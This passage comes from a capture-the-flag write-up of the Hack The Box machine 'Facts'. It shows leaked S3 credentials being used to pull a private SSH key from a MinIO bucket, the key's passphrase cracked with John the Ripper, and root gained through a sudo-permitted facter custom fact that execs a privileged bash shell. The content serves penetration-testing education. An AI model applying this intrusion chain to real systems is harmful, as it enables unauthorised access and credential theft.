   User ID: 5
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: AKIAE356689792F1158C
   s3 secret key: gRlcC4QksN2C6aDm6epbgGm3fhY6aPkKFNTUQeot
   s3 endpoint: http://localhost:54321
[+]Reverting User Role
   User ID: 5
   User Role: client
```
<div align="center">
<br>
<br>
</div>

### 3.3 Configuring my Attack Profile

Command: `aws configure --profile facts`

Breakdown: 

- **`aws configure`**
    - **Description:** AWS CLI Initialization.
    - **Purpose:** Opens an interactive prompt to set up security credentials and default settings for the tool.

- **`--profile facts`**
    - **Description:** Named Profile.
    - **Purpose:** Saves these specific credentials under the name "facts." This allows me to switch between different HTB boxes or real AWS accounts without overwriting keys.
    
	**Input Values used during configuration:**
	- **AWS Access Key ID:** `AKIAE356689792F1158C`
	- **AWS Secret Access Key:** `gRlcC4QksN2C6aDm6epbgGm3fhY6aPkKFNTUQeot`
	- **Default region name:** `us-east-1` (MinIO requires a region, though it's often ignored)
	- **Default output format:** `json`

Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
└─$ aws configure --profile facts  
AWS Access Key ID [None]: AKIAE356689792F1158C
AWS Secret Access Key [None]: gRlcC4QksN2C6aDm6epbgGm3fhY6aPkKFNTUQeot
Default region name [None]: 
Default output format [None]: json
```
<div align="center">
<br>
<br>
</div>

### 3.4 Validating Credentials and Listing Buckets

Once you've configured your profile, query the custom endpoint on port 54321 to list the available storage buckets.

Command: `aws --endpoint-url http://facts.htb:54321 s3 ls --profile facts`

Breakdown:

- **`--endpoint-url`**
    - **Description:** Custom Service Endpoint.
    - **Purpose:** Overrides the default Amazon URL. This forces the CLI to talk to the MinIO service running on the HTB box instead of trying to reach the public internet.
- **`s3 ls`**
    - **Description:** List S3 Buckets.
    - **Purpose:** Requests a list of all buckets that the provided credentials have permission to view.
- **`--profile facts`**
    - **Description:** Profile Selector.
    - **Purpose:** Tells the CLI to use the `AKIA...` keys we just saved in the previous step.

Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
└─$ aws --endpoint-url http://facts.htb:54321 s3 ls --profile facts
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```
<div align="center">
<br>
<br>
</div>

### 3.5 Bucket Enumeration

We've revealed two distinct buckets: `internal` and `randomfacts`. The existence of an `internal` bucket suggests a repository for sensitive administrative or system-level data.

Next let's list the objects residing within the `internal` bucket.

Command: `aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/ --profile facts`

Breakdown: 

- **`s3 ls s3://internal`**
    - **Description:** Recursive Object Listing. 
    - **Purpose:** Specifically targets the `internal` bucket to view all files and directories stored inside it.
- **`--endpoint-url http://facts.htb:54321`**
    - **Description:** Service Redirector.
    - **Purpose:** Ensures the request is routed to the MinIO service on the target box rather than the public AWS cloud.
- **`--profile facts`**
    - **Description:** Identity Context.
    - **Purpose:** Applies the `AKIA...` access key and secret key associated with the "facts" profile to authorize the request.

Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
└─$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/ --profile facts
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 13:45:13        220 .bash_logout
2026-01-08 13:45:13       3900 .bashrc
2026-01-08 13:47:17         20 .lesshst
2026-01-08 13:47:17        807 .profile
```

This looks like a classic "Home Directory" leak. Seeing folders like `.ssh/` and `.bundle/` inside an S3 bucket is a massive finding—it suggests the MinIO service might be misconfigured to serve the home directory of a system user.

The `.ssh/` directory is your high-value target here, as it likely contains private keys (`id_rsa`) that could grant you direct SSH access to the server.
<div align="center">
<br>
<br>
</div>

### 3.6 Enumeration of SSH Keys

The most critical discovery is the `.ssh/` directory. In a typical Linux environment, this folder stores cryptographic keys used for passwordless authentication. If a private key exists and is readable, it can be used to pivot from web-based exploitation to a full interactive shell via SSH.

Command: `aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/ --profile facts`

Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
└─$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/ --profile facts
2026-02-25 04:26:47         82 authorized_keys
2026-02-25 04:26:47        464 id_ed25519
```

That `id_ed25519` file is exactly what we were looking for. While `id_rsa` is more common in older systems, **ED25519** is a modern, faster, and more secure type of SSH key. Having this file means you likely have a direct ticket to a shell without needing a password.
<div align="center">
<br>
<br>
</div>

#### 3.6.1 Downloading the Private Key

To use the key for authentication, you first have to transfer it from the remote storage bucket to my local attack machine.

Command: `aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .. --profile facts`

Breakdown: 

**`s3 cp`**
- **Description:** S3 Copy Utility.
- **Purpose:** Downloads the specified file from the S3 bucket to the current local directory (indicated by the `.`).

Output: 

```shell
┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
└─$ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .. --profile facts 
download: s3://internal/.ssh/id_ed25519 to ../id_ed25519

┌──(kali㉿kali)-[~/CS/HTB/Facts/CVE-2025-2304]
└─$ aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/authorized_keys .. --profile facts
download: s3://internal/.ssh/authorized_keys to ../authorized_keys         

┌──(kali㉿kali)-[~/CS/HTB/Facts]
└─$ ls
authorized_keys  CVE-2025-2304  id_ed25519
```
<div align="center">
<br>
<br>
</div>

#### 3.6.2 Check if the Key has a Passphrase

Command: `ssh-keygen -y -f id_ed25519`

**It asks for a passphrase:** The key is encrypted. We'll need to crack it using `john` (John the Ripper).
<div align="center">
<br>
<br>
</div>

#### 3.6.3 Cracking the Passphrase

1. Extract the Hash: `/usr/share/john/ssh2john.py id_ed25519 > hash`

2. Crack the Hash: `john --wordlist=/usr/share/wordlists/rockyou.txt hash`
	
	Breakdown: 
	- **`john`**	    
	    - **Description:** John the Ripper (JtR) Password Cracker.	        
	    - **Purpose:** A high-speed password recovery tool that tests thousands of potential passwords against a given hash.	        
	- **`--wordlist=/usr/share/wordlists/rockyou.txt`**	    
	    - **Description:** Dictionary Source.	        
	    - **Purpose:** Uses the standard `rockyou.txt` wordlist, which contains millions of common passwords leaked from real-world breaches.	        
	- **`hash`**	    
	    - **Description:** Target Hash File.	        
	    - **Purpose:** The file containing the specialized SSH key hash generated by `ssh2john.py`.
	
	Output:
		
``` shell
┌──(kali㉿kali)-[~/CS/HTB/Facts]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
dragonballz      (id_ed25519)     
1g 0:00:03:08 DONE (2026-02-25 05:41) 0.005303g/s 16.97p/s 16.97c/s 16.97C/s grecia..imissu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
<div align="center">
<br>
<br>
</div>

#### 3.6.4 Extracting the Identity Comment

By using the `ssh-keygen` utility, export the public key from the private file. Upon entering the cracked passphrase (`dragonballz`), the tool revealed the full public key string, including the trailing metadata.

**Command Breakdown:**

Command: `ssh-keygen -y -f id_ed25519`

- **`ssh-keygen`**
    - **Description:** SSH Key Management Tool.
    - **Purpose:** A standard utility for creating, managing, and converting authentication keys for the SSH protocol.
- **`-y`**
    - **Description:** Export Public Key.
    - **Purpose:** This flag reads an OpenSSH format private key and prints its public key counterpart to the standard output. This tells the tool: "Don't make a new key. Instead, read the private key I'm giving you and tell me what its public counterpart looks like."
- **`-f id_ed25519`**
    - **Description:** File Specification.
    - **Purpose:** Points the tool to the specific private key file acquired from the MinIO storage.

Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB/Facts]
└─$ ssh-keygen -y -f id_ed25519
Enter passphrase for "id_ed25519": 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPm3PP5FI/xlBsHvzncKzV0oXPVpXlBOxdja+vHzKCam trivia@facts.htb
```

##### 1. The Relationship: The "Seal and the Ring"

To understand why this is possible, imagine a **Signet Ring** (the private key) and the **Wax Seal** it creates (the public key).

- If you have the ring, you can create the seal whenever you want.

- If you only have the wax seal, it is nearly impossible to recreate the exact ring.

- Because the ring (private key) contains all the mathematical "DNA" of the pair, tools like `ssh-keygen` can look at the ring and say, "If I pressed this into wax right now, this is what the seal would look like."

##### 2. Why we do this in Hacking

In this specific scenario, you found the **Private Key** (the ring) inside a storage bucket. You didn't find a label telling you who the ring belonged to.

1. **The Hidden Label:** When people create keys, the computer often "etches" their username into the metadata of that key pair.

2. **The Extraction:** By "exporting" or "viewing" the public version of your stolen key using `ssh-keygen -y`, you are forcing the tool to regenerate that "wax seal."

3. **The Result:** Along with the mathematical key string, the tool prints the **comment** (the etching) that was stored inside the private file. In your case, that comment was `trivia@facts.htb`.
<div align="center">
<br>
<br>
</div>

#### 3.6.5 Setting Permissions

Before attempting to log in, modify the file permissions to ensure only your current user has read/write access.
Linux SSH clients are very strict about security. If a private key file is "too open" (meaning other users on your Kali machine could theoretically read it), the SSH client will refuse to use it and throw a warning.

Command: `chmod 600 id_ed25519`

Breakdown:

- **`chmod`**
    - **Description:** Change Mode.
    - **Purpose:** A system utility used to change the access permissions of file system objects.
- **`600`**
    - **Description:** Numerical Permission Mask.
    - **Purpose:** Sets the file so only the **Owner** can Read and Write (`6`), while the **Group** and **Others** have zero permissions (`00`). This is a mandatory requirement for SSH private keys.
<div align="center">
<br>
<br>
</div>

### 3.7 Establishing the Initial Shell

With the identity verified and the key unlocked, establish a secure shell (SSH) session to the target.

Command: `ssh -i id_ed25519 trivia@facts.htb`

**Passphrase:** `dragonballz`

Breakdown: 


Output:

```shell
┌──(kali㉿kali)-[~/CS/HTB/Facts]
└─$ ssh -i id_ed25519 trivia@facts.htb  
Enter passphrase for key 'id_ed25519': 
Last login: Wed Feb 25 10:49:00 UTC 2026 from 10.10.14.247 on ssh
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Feb 25 12:55:00 PM UTC 2026

  System load:           0.05
  Usage of /:            71.7% of 7.28GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             221
  Users logged in:       1
  IPv4 address for eth0: 10.129.5.179
  IPv6 address for eth0: dead:beef::250:56ff:feb0:5866


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

trivia@facts:~$ 
```
<div align="center">
<br>
<br>
</div>

### 3.8 User Flag Discovery and Retrieval

The flag wasn't in the `trivia` home directory, but belongs to another user named **william**.

```shell
trivia@facts:~$ pwd
/home/trivia
trivia@facts:~$ ls -la
total 36
drwxr-x--- 6 trivia trivia 4096 Jan 28 16:17 .
drwxr-xr-x 4 root   root   4096 Jan  8 17:53 ..
lrwxrwxrwx 1 root   root      9 Jan 26 11:40 .bash_history -> /dev/null
-rw-r--r-- 1 trivia trivia  220 Aug 20  2024 .bash_logout
-rw-r--r-- 1 trivia trivia 3900 Jan  8 18:19 .bashrc
drwxrwxr-x 3 trivia trivia 4096 Jan  8 18:01 .bundle
drwx------ 2 trivia trivia 4096 Jan  8 18:58 .cache
drwxrwxr-x 3 trivia trivia 4096 Jan  8 17:52 .local
-rw-r--r-- 1 trivia trivia  807 Aug 20  2024 .profile
drwx------ 2 trivia trivia 4096 Feb 25 09:25 .ssh
trivia@facts:~$ find / -name user.txt 2>/dev/null
/home/william/user.txt
trivia@facts:~$ cat /home/william/user.txt 

```


<div align="center">
<br>
<br>
</div>

### 3.9 PrivEsc Reconnaissance

With a stable shell as the `trivia` user, you can now transition to searching for a path to escalate privileges to `root`.

In the world of CTFs and penetration testing, the transition from "Initial Access" to "Root" is all about **System Enumeration**. You find the path forward by asking the system what it allows you to do.
<div align="center">
<br>
<br>
</div>

#### 3.9.1 Auditing Sudo Privileges

Command: `sudo -l`

It lists the specific commands the current user is permitted to run with elevated privileges.

Output: 

```shell
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

The command returned a critical entry: `(ALL) NOPASSWD: /usr/bin/facter`

- **User Scope `(ALL)`:** This indicates that the command can be run as any user on the system, most importantly as **root**.
- **Access Level `NOPASSWD`:** This means I can invoke the command with root power without needing to provide the `trivia` user's password or a root password.
- **Target Binary:** `/usr/bin/facter`.

Since **Facter** is a Ruby-based tool used for system profiling, it is designed to be extensible. Its vulnerability in this context lies in its ability to load **Custom Facts** from external Ruby scripts.
<div align="center">
<br>
<br>
</div>
#### 3.9.2 A Little bit about `facter`

Almost every Linux privilege escalation begins with a website called **GTFOBins**. It is a curated list of Linux binaries that can be abused to bypass system restrictions.

Go to Google and search: `facter privilege escalation` or `facter gtfobins`.

Results:

> According to [GTFOBins](https://gtfobins.linuxsec.org/gtfobins/facter/), `facter` (a system profiling tool) can be abused to break out of restricted environments or escalate privileges if it has special permissions (like `sudo`). 
> 
> Here are the techniques listed for **facter** on GTFOBins:
> 
> Shell: 
> 	This technique spawns an interactive system shell to break out from restricted environments. 
> 	The vulnerability stems from the way `facter` loads custom facts. By using the `FACTERLIB` environment variable, a user can point the tool to a directory containing malicious Ruby scripts. When `facter` runs, it executes any Ruby files found in that path.
> 
> Privilege Escalation Risk: 
> 	If `facter` is configured with `sudo` rights without restricting environment variables, a non-privileged user can redirect `FACTERLIB` to a script that executes commands as the root user. This allows for a complete takeover of the system.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. PrivEsc

Following the identification of the `sudo` misconfiguration, proceed to exploit the extensible nature of the **Facter** profiling tool. Since Facter is built on **Ruby**, it allows users to define "Custom Facts" using Ruby scripts, which are executed whenever Facter is invoked.
<div align="center">
<br>
<br>
</div>

### 4.1 Crafting the Payload

Here's a Ruby script designed to spawn an interactive bash shell with administrative privileges. 
By using the `-p` flag with `/bin/bash`, it ensures that the shell would maintain the effective user ID (root) provided by the `sudo` command.

```shell
trivia@facts:~$ cat nyorosha.rb 
```

```rb
Facter.add(:nyorosha) do
  setcode { exec("/bin/bash -p") }
end
```

Breakdown:

- **`Facter.add(:nyorosha)`**: This defines a new fact named `nyorosha`.
- **`setcode do ... end`**: This block tells Facter what code to run to determine the value of this "fact."
- **`exec("/bin/bash -p")`**: Instead of returning a value (like an IP address), the script replaces the current process with a root-level bash shell.
<div align="center">
<br>
<br>
</div>

### 4.2 Execution and Root Shell Capture

Command: `sudo facter --custom-dir=/home/trivia nyorosha`

Breakdown:

- **`sudo`**: Runs the process as the root user.
- **`--custom-dir=/home/trivia`**: Tells Facter to look in the `/tmp` folder for any `.rb` files.
- **`nyorosha`**: Requests the specific fact I defined in the script.

```shell
trivia@facts:~$ sudo facter --custom-dir=/home/trivia nyorosha
root@facts:/home/trivia# 
```
<div align="center">
<br>
<br>
</div>

### 4.2 Result: Full System Compromise

The execution is successful, immediately granting a root terminal session.

```shell
root@facts:/home/trivia# whoami
root
root@facts:/home/trivia# ls
nyorosha.rb
root@facts:/home/trivia# find / -name root.txt 2>/dev/null
/root/root.txt
root@facts:/home/trivia# cat /root/root.txt 

```


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. Conclusion & Remediation

Closing Remarks: Ni mbaya! Baradhuli
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

[^1]: [Camaleon CMS 2.9.0 – Authenticated Privilege Escalation (Role Change) + Optional S3 Config Leak](https://github.com/Alien0ne/CVE-2025-2304#camaleon-cms-290--authenticated-privilege-escalation-role-change--optional-s3-config-leak)
